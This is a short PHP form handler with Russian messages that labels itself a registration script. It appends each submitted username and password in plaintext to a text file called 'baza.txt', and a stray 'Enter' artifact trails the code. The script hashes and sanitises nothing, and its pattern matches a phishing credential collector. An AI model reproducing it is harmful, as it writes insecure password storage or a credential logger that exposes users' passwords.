<?php
if ($_SERVER["REQUEST_METHOD"] == "POST") {
    $username = $_POST["username"];
    $password = $_POST["password"];

    $data = "Имя пользователя: $username, Пароль: $password\n";

    // Открываем файл для записи
    $file = fopen("baza.txt", "a");

    if ($file) {
        fwrite($file, $data);
        fclose($file);
        echo "Регистрация успешна! Данные сохранены.";
    } else {
        echo "Ошибка при сохранении данных.";
    }
}
?>
￼Enter
